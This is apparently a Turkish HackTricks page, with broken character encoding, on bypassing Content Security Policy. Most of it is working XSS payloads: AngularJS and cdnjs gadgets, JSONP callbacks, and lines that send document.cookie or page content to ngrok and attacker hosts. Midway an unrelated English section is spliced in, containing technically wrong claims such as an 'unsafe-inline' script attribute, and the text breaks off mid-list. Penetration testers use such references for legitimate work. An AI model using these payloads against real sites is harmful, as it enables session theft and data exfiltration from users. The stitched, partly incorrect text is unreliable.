# Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) Atlatma

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na dalmÄ±ÅŸ iÃ§eriklerle etkileÅŸim kurun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni baÅŸlayan hata Ã¶dÃ¼lleri ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## CSP Nedir

Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP), Ã¶ncelikle **cross-site scripting (XSS) gibi saldÄ±rÄ±lara karÅŸÄ± koruma saÄŸlamayÄ± amaÃ§layan** bir tarayÄ±cÄ± teknolojisi olarak tanÄ±nÄ±r. TarayÄ±cÄ± tarafÄ±ndan gÃ¼venli bir ÅŸekilde yÃ¼klenen kaynaklarÄ±n yollarÄ±nÄ± ve kaynaklarÄ± tanÄ±mlayarak Ã§alÄ±ÅŸÄ±r. Bu kaynaklar, resimler, Ã§erÃ§eveler ve JavaScript gibi bir dizi Ã¶ÄŸeyi kapsar. Ã–rneÄŸin, bir politika, aynÄ± etki alanÄ±ndan (self) kaynaklarÄ±n yÃ¼klenmesine ve yÃ¼rÃ¼tÃ¼lmesine izin verebilir, iÃ§erideki kaynaklara ve `eval`, `setTimeout` veya `setInterval` gibi iÅŸlevler aracÄ±lÄ±ÄŸÄ±yla dize kodunun yÃ¼rÃ¼tÃ¼lmesine izin verebilir.

CSP'nin uygulanmasÄ±, **yanÄ±t baÅŸlÄ±klarÄ±** aracÄ±lÄ±ÄŸÄ±yla veya HTML sayfasÄ±na **meta Ã¶ÄŸeleri ekleyerek** gerÃ§ekleÅŸtirilir. Bu politikaya uygun olarak, tarayÄ±cÄ±lar bu ÅŸartlarÄ± proaktif olarak uygular ve tespit edilen ihlalleri hemen engeller.

- YanÄ±t baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla uygulanÄ±r:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Meta etiketi aracÄ±lÄ±ÄŸÄ±yla uygulanÄ±r:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### BaÅŸlÄ±klar

CSP, bu baÅŸlÄ±klar kullanÄ±larak zorunlu hale getirilebilir veya izlenebilir:

* `Content-Security-Policy`: CSP'yi zorlar; tarayÄ±cÄ± herhangi bir ihlali engeller.
* `Content-Security-Policy-Report-Only`: Ä°zleme iÃ§in kullanÄ±lÄ±r; ihlalleri engellemeden raporlar. Ã–n Ã¼retim ortamlarÄ±nda test etmek iÃ§in idealdir.

### KaynaklarÄ± TanÄ±mlama

CSP, etkin ve pasif iÃ§eriÄŸi yÃ¼kleme iÃ§in kÃ¶kenleri kÄ±sÄ±tlar ve iÃ§erisinde `eval()` kullanÄ±mÄ± gibi konularÄ± kontrol eder. Bir Ã¶rnek politika ÅŸu ÅŸekildedir:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### YÃ¶nergeler

* **script-src**: URL'ler, iÃ§e gÃ¶mÃ¼lÃ¼ betikler ve olay iÅŸleyicileri veya XSLT stil sayfalarÄ± tarafÄ±ndan tetiklenen betikler de dahil olmak Ã¼zere JavaScript iÃ§in belirli kaynaklarÄ± izin verir.
* **default-src**: Belirli getirme yÃ¶nergeleri yokken kaynaklarÄ± getirmek iÃ§in varsayÄ±lan bir politika belirler.
* **child-src**: Web iÅŸÃ§ileri ve gÃ¶mÃ¼lÃ¼ Ã§erÃ§eve iÃ§erikleri iÃ§in izin verilen kaynaklarÄ± belirtir.
* **connect-src**: fetch, WebSocket, XMLHttpRequest gibi arabirimler kullanÄ±larak yÃ¼klenebilecek URL'leri sÄ±nÄ±rlar.
* **frame-src**: Ã‡erÃ§eveler iÃ§in URL'leri sÄ±nÄ±rlar.
* **frame-ancestors**: GeÃ§erli sayfayÄ± gÃ¶mebilecek kaynaklarÄ± belirtir, `<frame>`, `<iframe>`, `<object>`, `<embed>` ve `<applet>` gibi Ã¶ÄŸeler iÃ§in geÃ§erlidir.
* **img-src**: Resimler iÃ§in izin verilen kaynaklarÄ± tanÄ±mlar.
* **font-src**: `@font-face` kullanÄ±larak yÃ¼klenen yazÄ± tipleri iÃ§in geÃ§erli kaynaklarÄ± belirtir.
* **manifest-src**: Uygulama belirteÃ§ dosyalarÄ±nÄ±n izin verilen kaynaklarÄ±nÄ± tanÄ±mlar.
* **media-src**: Medya nesnelerini yÃ¼klemek iÃ§in izin verilen kaynaklarÄ± tanÄ±mlar.
* **object-src**: `<object>`, `<embed>` ve `<applet>` Ã¶ÄŸeleri iÃ§in izin verilen kaynaklarÄ± tanÄ±mlar.
* **base-uri**: `<base>` Ã¶ÄŸeleri kullanÄ±larak yÃ¼kleme iÃ§in izin verilen URL'leri belirtir.
* **form-action**: Form gÃ¶nderimleri iÃ§in geÃ§erli uÃ§ noktalarÄ± listeler.
* **plugin-types**: Bir sayfanÄ±n Ã§aÄŸÄ±rabileceÄŸi mime tÃ¼rlerini sÄ±nÄ±rlar.
* **upgrade-insecure-requests**: TarayÄ±cÄ±lara HTTP URL'lerini HTTPS'ye yeniden yazmalarÄ±nÄ± sÃ¶yler.
* **sandbox**: `<iframe>`'in sandbox Ã¶zniteliÄŸiyle benzer kÄ±sÄ±tlamalar uygular.
* **report-to**: Politika ihlal edildiÄŸinde raporun gÃ¶nderileceÄŸi bir grup belirtir.
* **worker-src**: Worker, SharedWorker veya ServiceWorker betikleri iÃ§in geÃ§erli kaynaklarÄ± belirtir.
* **prefetch-src**: AlÄ±nacak veya Ã¶nceden alÄ±nacak kaynaklar iÃ§in geÃ§erli kaynaklarÄ± belirtir.
* **navigate-to**: Bir belgenin herhangi bir ÅŸekilde (a, form, window.location, window.open, vb.) gezinebileceÄŸi URL'leri sÄ±nÄ±rlar.


### Kaynaklar

* `*`: `data:`, `blob:`, `filesystem:` ÅŸemalarÄ±na sahip URL'ler dÄ±ÅŸÄ±nda tÃ¼m URL'lere izin verir.
* `'self'`: AynÄ± etki alanÄ±ndan yÃ¼kleme yapmaya izin verir.
* `'data'`: KaynaklarÄ±n veri ÅŸemasÄ± Ã¼zerinden yÃ¼klenmesine izin verir (Ã¶rneÄŸin, Base64 kodlu resimler).
* `'none'`: Herhangi bir kaynaktan yÃ¼kleme yapmayÄ± engeller.
* `'unsafe-eval'`: `eval()` ve benzeri yÃ¶ntemlerin kullanÄ±mÄ±na izin verir, gÃ¼venlik nedenleriyle Ã¶nerilmez.
* `'unsafe-hashes'`: Belirli iÃ§e gÃ¶mÃ¼lÃ¼ olay iÅŸleyicilerini etkinleÅŸtirir.
* `'unsafe-inline'`: Ä°Ã§e gÃ¶mÃ¼lÃ¼ `<script>` veya `<style>` gibi kaynaklarÄ±n kullanÄ±mÄ±na izin verir, gÃ¼venlik nedenleriyle Ã¶nerilmez.
* `'nonce'`: Kriptografik bir nonce (bir kez kullanÄ±lan sayÄ±) kullanarak belirli iÃ§e gÃ¶mÃ¼lÃ¼ betiklere beyaz liste oluÅŸturur.
* `'sha256-<hash>'`: Belirli bir sha256 karma deÄŸeri olan betikleri beyaz listeye alÄ±r.
* `'strict-dynamic'`: Bir nonce veya karma tarafÄ±ndan beyaz listeye alÄ±nmÄ±ÅŸsa herhangi bir kaynaktan betik yÃ¼klenmesine izin verir.
* `'host'`: `example.com` gibi belirli bir ana bilgisayar belirtir.
* `https:`: HTTPS kullanan URL'leri sÄ±nÄ±rlar.
* `blob:`: Blob URL'lerinden kaynaklarÄ±n yÃ¼klenmesine izin verir (Ã¶rneÄŸin, JavaScript tarafÄ±ndan oluÅŸturulan Blob URL'leri).
* `filesystem:`: Dosya sisteminden kaynaklarÄ±n yÃ¼klenmesine izin verir.
* `'report-sample'`: Ä°hlal raporunda ihlal eden kodun bir Ã¶rneÄŸini iÃ§erir (hata ayÄ±klama iÃ§in kullanÄ±ÅŸlÄ±dÄ±r).
* `'strict-origin'`: 'self' ile benzerdir, ancak kaynaklarÄ±n protokol gÃ¼venlik dÃ¼zeyinin belgeyle eÅŸleÅŸtiÄŸinden emin olur (yalnÄ±zca gÃ¼venli kÃ¶kenler gÃ¼venli kÃ¶kenlerden kaynak yÃ¼kleyebilir).
* `'strict-origin-when-cross-origin'`: AynÄ± kÃ¶ken istekleri yaparken tam URL'leri gÃ¶nderir, ancak istek Ã§apraz kÃ¶kenli olduÄŸunda yalnÄ±zca kÃ¶keni gÃ¶nderir.
* `'unsafe-allow-redirects'`: Hemen baÅŸka bir kaynaÄŸa yÃ¶nlendirecek kaynaklarÄ±n yÃ¼klenmesine izin verir. GÃ¼venlik zayÄ±flatÄ±ldÄ±ÄŸÄ± iÃ§in Ã¶nerilmez.


## GÃ¼vensiz CSP KurallarÄ±

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Ã‡alÄ±ÅŸan payload: `"/><script>alert(1);</script>`

#### Iframe'lar aracÄ±lÄ±ÄŸÄ±yla self + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Ã‡alÄ±ÅŸan yÃ¼k:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

EÄŸer bir ÅŸekilde izin verilen bir JS kodu, JS kodunuzla birlikte DOM'da yeni bir script etiketi oluÅŸturursa, izin verilen bir betik tarafÄ±ndan oluÅŸturulduÄŸu iÃ§in **yeni script etiketi Ã§alÄ±ÅŸtÄ±rÄ±lmaya izin verilecektir**.

### Joker (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Ã‡alÄ±ÅŸan yÃ¼k:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-src ve default-src eksikliÄŸi

{% hint style="danger" %}
**Bu artÄ±k Ã§alÄ±ÅŸmÄ±yor gibi gÃ¶rÃ¼nÃ¼yor**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Ã‡alÄ±ÅŸan yÃ¼kler:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Dosya YÃ¼kleme + 'self'

Bu yÃ¶ntem, bir web uygulamasÄ±nÄ±n iÃ§erik gÃ¼venlik politikasÄ±nÄ± (Content Security Policy - CSP) atlayarak dosya yÃ¼kleme iÅŸlemini gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lÄ±r. CSP, web uygulamalarÄ±nda XSS saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in kullanÄ±lan bir gÃ¼venlik mekanizmasÄ±dÄ±r. 'self' ifadesi, web uygulamasÄ±nÄ±n kendi kaynaklarÄ±na eriÅŸim izni verir.

Bu yÃ¶ntemi kullanmak iÃ§in, hedef web uygulamasÄ±nda bir dosya yÃ¼kleme iÅŸlemi gerÃ§ekleÅŸtirilirken, CSP politikasÄ±nda 'self' ifadesinin bulunmasÄ± gerekmektedir. Bu durumda, saldÄ±rgan, dosyayÄ± yÃ¼klemek iÃ§in 'self' ifadesini kullanarak CSP politikasÄ±nÄ± atlayabilir.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki CSP politikasÄ±:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
```

Bu politikada, 'self' ifadesi, kaynaklarÄ±n yalnÄ±zca web uygulamasÄ±nÄ±n kendi alanÄ±ndan yÃ¼klenmesine izin verir. SaldÄ±rgan, bu politikayÄ± atlamak iÃ§in dosyayÄ± yÃ¼klemek iÃ§in 'self' ifadesini kullanabilir.

Bu yÃ¶ntem, web uygulamasÄ±nÄ±n CSP politikasÄ±nÄ±n zayÄ±f bir ÅŸekilde yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ± durumlarda etkili olabilir. Ancak, gÃ¼venlik aÃ§Ä±ÄŸÄ± tespit edildiÄŸinde, web uygulamasÄ±nÄ±n CSP politikasÄ±nÄ±n gÃ¼ncellenmesi gerekmektedir.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
EÄŸer bir JS dosyasÄ± yÃ¼kleyebiliyorsanÄ±z, bu CSP'yi atlayabilirsiniz:

Ã‡alÄ±ÅŸan payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Ancak, sunucunun **yÃ¼klenen dosyayÄ± doÄŸruladÄ±ÄŸÄ± ve yalnÄ±zca belirli tÃ¼rde dosyalarÄ±n yÃ¼klenmesine izin verdiÄŸi** oldukÃ§a olasÄ±dÄ±r.

DahasÄ±, sunucu tarafÄ±ndan kabul edilen bir uzantÄ±yla (_script.png_ gibi) bir dosyanÄ±n iÃ§ine **JS kodu yÃ¼kleyebilseniz bile**, bu yeterli olmayacaktÄ±r Ã§Ã¼nkÃ¼ apache sunucusu gibi bazÄ± sunucular, dosyanÄ±n uzantÄ±sÄ±na dayanarak **dosyanÄ±n MIME tÃ¼rÃ¼nÃ¼ seÃ§er** ve Chrome gibi tarayÄ±cÄ±lar, bir resim olmasÄ± gereken bir ÅŸeyin iÃ§indeki Javascript kodunu **Ã§alÄ±ÅŸtÄ±rmayÄ± reddeder**. "Neyse ki", hatalar var. Ã–rneÄŸin, bir CTF'den Ã¶ÄŸrendiÄŸim gibi **Apache, .wave uzantÄ±sÄ±nÄ± bilmez**, bu yÃ¼zden audio/\* gibi bir **MIME tÃ¼rÃ¼yle sunmaz**.

Buradan, bir XSS ve dosya yÃ¼kleme bulursanÄ±z ve **yanlÄ±ÅŸ yorumlanan bir uzantÄ±** bulmayÄ± baÅŸarÄ±rsanÄ±z, o uzantÄ±ya sahip bir dosyayÄ± ve betiÄŸin Ä°Ã§eriÄŸini yÃ¼klemeyi deneyebilirsiniz. Veya, sunucu yÃ¼klenen dosyanÄ±n doÄŸru biÃ§imini kontrol ediyorsa, bir poliglot oluÅŸturabilirsiniz ([burada bazÄ± poliglot Ã¶rnekleri](https://github.com/Polydet/polyglot-database)).

### ÃœÃ§Ã¼ncÃ¼ Taraf UÃ§ NoktalarÄ± + ('unsafe-eval')

{% hint style="warning" %}
AÅŸaÄŸÄ±daki payloadlardan bazÄ±larÄ± iÃ§in **`unsafe-eval` bile gerekli deÄŸildir**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Angular'Ä±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olan bir sÃ¼rÃ¼mÃ¼nÃ¼ yÃ¼kleyin ve keyfi JavaScript kodunu Ã§alÄ±ÅŸtÄ±rÄ±n:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Angular + `window` nesnesini dÃ¶ndÃ¼ren bir kÃ¼tÃ¼phane kullanarak payloadlar ([bu yazÄ±ya bakÄ±n](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Bu yazÄ±, `cdn.cloudflare.com` (veya izin verilen baÅŸka bir JS kÃ¼tÃ¼phane deposu) Ã¼zerinden **tÃ¼m kÃ¼tÃ¼phaneleri yÃ¼kleyebileceÄŸinizi**, her bir kÃ¼tÃ¼phaneden eklenen tÃ¼m fonksiyonlarÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸinizi ve **hangi fonksiyonlarÄ±n hangi kÃ¼tÃ¼phanelerden `window` nesnesini dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nÃ¼** kontrol edebileceÄŸinizi gÃ¶stermektedir.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Google recaptcha JS kodunu kÃ¶tÃ¼ye kullanma

[**Bu CTF Ã§Ã¶zÃ¼mÃ¼ne**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) gÃ¶re, CSP iÃ§inde [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) adresini kÃ¶tÃ¼ye kullanarak CSP'yi atlayarak keyfi JS kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### ÃœÃ§Ã¼ncÃ¼ Taraf UÃ§ NoktalarÄ± + JSONP

Bir web uygulamasÄ±nda iÃ§erik gÃ¼venliÄŸi politikasÄ± (CSP) kullanÄ±lÄ±yorsa, Ã¼Ã§Ã¼ncÃ¼ taraf uÃ§ noktalara eriÅŸim engellenebilir. Ancak, JSONP (JSON with Padding) kullanarak bu kÄ±sÄ±tlamalarÄ± aÅŸmak mÃ¼mkÃ¼ndÃ¼r.

JSONP, bir web sayfasÄ±nÄ±n farklÄ± bir etki alanÄ±ndaki bir sunucudan veri almasÄ±na izin veren bir yÃ¶ntemdir. Bu yÃ¶ntem, bir `<script>` etiketi kullanarak veriyi alÄ±r ve geri Ã§aÄŸÄ±rma iÅŸlevini kullanarak sayfaya ekler. CSP, `<script>` etiketlerinin yalnÄ±zca belirli kaynaklardan yÃ¼klenmesine izin verdiÄŸinden, JSONP bu kÄ±sÄ±tlamalarÄ± atlayabilir.

Bir CSP tarafÄ±ndan engellenen bir Ã¼Ã§Ã¼ncÃ¼ taraf uÃ§ noktaya eriÅŸmek iÃ§in, hedef sunucuda JSONP desteÄŸi olmalÄ±dÄ±r. JSONP desteÄŸi sunan bir API kullanarak, hedef sunucuya bir istek gÃ¶nderilebilir ve yanÄ±t JSONP formatÄ±nda alÄ±nabilir. Bu yanÄ±t, `<script>` etiketi iÃ§indeki bir geri Ã§aÄŸÄ±rma iÅŸlevi aracÄ±lÄ±ÄŸÄ±yla sayfaya eklenir.

Bu yÃ¶ntem, CSP tarafÄ±ndan engellenen Ã¼Ã§Ã¼ncÃ¼ taraf uÃ§ noktalara eriÅŸmek iÃ§in kullanÄ±labilir. Ancak, JSONP'nin gÃ¼venlik riskleri olduÄŸunu unutmamak Ã¶nemlidir. JSONP, XSS (Cross-Site Scripting) saldÄ±rÄ±larÄ±na yol aÃ§abilir ve gÃ¼venlik aÃ§Ä±klarÄ±na neden olabilir. Bu nedenle, JSONP kullanÄ±rken dikkatli olunmalÄ± ve gÃ¼venlik Ã¶nlemleri alÄ±nmalÄ±dÄ±r.
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
AÅŸaÄŸÄ±daki gibi senaryolarda, `script-src` `self` ve belirli bir etki alanÄ±na ayarlandÄ±ÄŸÄ±nda, JSONP kullanÄ±larak bypass edilebilir. JSONP uÃ§ noktalarÄ±, gÃ¼vensiz geri Ã§aÄŸÄ±rma yÃ¶ntemlerine izin verir ve saldÄ±rganÄ±n XSS gerÃ§ekleÅŸtirmesine olanak tanÄ±r, Ã§alÄ±ÅŸan payload:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **farklÄ± web sitelerinin CSP bypass iÃ§in kullanÄ±lmaya hazÄ±r JSONP uÃ§ noktalarÄ±nÄ± iÃ§erir.**

AynÄ± zafiyet, **gÃ¼venilir uÃ§ nokta bir AÃ§Ä±k YÃ¶nlendirme iÃ§eriyorsa** meydana gelecektir Ã§Ã¼nkÃ¼ baÅŸlangÄ±Ã§ uÃ§ noktasÄ± gÃ¼venilir ise yÃ¶nlendirmeler de gÃ¼venilir kabul edilir.

### ÃœÃ§Ã¼ncÃ¼ Taraf KÃ¶tÃ¼ye KullanÄ±mlar
AÅŸaÄŸÄ±daki [gÃ¶nderide](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) aÃ§Ä±klandÄ±ÄŸÄ± gibi, CSP'de izin verilen birÃ§ok Ã¼Ã§Ã¼ncÃ¼ taraf alanÄ±, veri sÄ±zdÄ±rmak veya JavaScript kodu Ã§alÄ±ÅŸtÄ±rmak iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir. Bu Ã¼Ã§Ã¼ncÃ¼ taraflardan bazÄ±larÄ± ÅŸunlardÄ±r:

| KuruluÅŸ | Ä°zin Verilen Alan | Yetenekler |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | Veri SÄ±zdÄ±rma |
| Hotjar | *.hotjar.com, ask.hotjar.io | Veri SÄ±zdÄ±rma |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Ã‡alÄ±ÅŸtÄ±rma |
| Amazon CloudFront | *.cloudfront.net | Veri SÄ±zdÄ±rma, Ã‡alÄ±ÅŸtÄ±rma |
| Amazon AWS | *.amazonaws.com | Veri SÄ±zdÄ±rma, Ã‡alÄ±ÅŸtÄ±rma |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Veri SÄ±zdÄ±rma, Ã‡alÄ±ÅŸtÄ±rma |
| Salesforce Heroku	| *.herokuapp.com | Veri SÄ±zdÄ±rma, Ã‡alÄ±ÅŸtÄ±rma |
| Google Firebase | *.firebaseapp.com | Veri SÄ±zdÄ±rma, Ã‡alÄ±ÅŸtÄ±rma |

Hedefinizin CSP'sinde izin verilen alanlardan herhangi birini bulursanÄ±z, Ã¼Ã§Ã¼ncÃ¼ taraf hizmetine kaydolarak CSP'yi atlayabilir ve ya veriyi bu hizmete sÄ±zdÄ±rabilir ya da kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki CSP'yi bulursanÄ±z:
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
# Content Security Policy (CSP) Bypass

Content Security Policy (CSP) is a security mechanism implemented by web applications to mitigate the risk of cross-site scripting (XSS) attacks. CSP allows web developers to specify which resources (such as scripts, stylesheets, and images) are allowed to be loaded and executed on a web page. However, there are certain techniques that can be used to bypass CSP and potentially exploit vulnerabilities in the application.

## Bypassing CSP using Inline Scripts

CSP typically restricts the execution of inline scripts, which are scripts embedded directly within HTML tags. However, there are several ways to bypass this restriction:

1. **Event Handlers**: By using event handlers such as `onload` or `onclick`, it is possible to execute arbitrary JavaScript code inline. For example:

```html
<img src="image.jpg" onload="alert('XSS')">
```

2. **Data URIs**: Data URIs allow embedding data directly into the HTML document. By using a data URI with a `script` tag, it is possible to execute inline JavaScript code. For example:

```html
<img src="data:image/svg+xml,<svg/onload=alert('XSS')>">
```

3. **`javascript:` URL scheme**: The `javascript:` URL scheme allows executing JavaScript code directly in the URL. By using this scheme, it is possible to bypass CSP and execute inline scripts. For example:

```html
<a href="javascript:alert('XSS')">Click me</a>
```

## Bypassing CSP using External Scripts

CSP also restricts the loading and execution of external scripts. However, there are techniques that can be used to bypass this restriction:

1. **Whitelisted Domains**: If the CSP policy allows loading scripts from specific domains, it may be possible to find a subdomain or a different domain that is not restricted by CSP. For example, if the CSP policy allows loading scripts from `example.com`, it may be possible to load a script from `subdomain.example.com` or `evil.com`.

2. **Nonce-based CSP**: Some CSP policies use a nonce (a random value) to allow specific inline scripts to be executed. By injecting a script tag with the correct nonce value, it is possible to bypass CSP and execute arbitrary JavaScript code. For example:

```html
<script nonce="randomvalue">alert('XSS')</script>
```

3. **Unsafe Inline Scripts**: In some cases, the CSP policy may allow specific inline scripts to be executed. By injecting a script tag with the `unsafe-inline` attribute, it is possible to bypass CSP and execute arbitrary JavaScript code. For example:

```html
<script src="https://example.com/script.js" nonce="randomvalue"></script>
<script src="https://example.com/script.js" unsafe-inline></script>
```

## Conclusion

Content Security Policy (CSP) is an important security mechanism that helps protect web applications against cross-site scripting (XSS) attacks. However, it is not foolproof, and there are techniques that can be used to bypass CSP. Web developers should be aware of these bypass techniques and take appropriate measures to mitigate the risk of exploitation.
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
Verileri Ã§Ä±karmanÄ±z gerekiyor, [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) ile her zaman yapÄ±ldÄ±ÄŸÄ± gibi. Bu durumda, genel olarak aÅŸaÄŸÄ±daki adÄ±mlarÄ± izlersiniz:

1. Buradan bir Facebook GeliÅŸtirici hesabÄ± oluÅŸturun.
1. Yeni bir "Facebook GiriÅŸi" uygulamasÄ± oluÅŸturun ve "Web sitesi" seÃ§eneÄŸini seÃ§in.
1. "Ayarlar -> Temel"e gidin ve "Uygulama KimliÄŸi"ni alÄ±n.
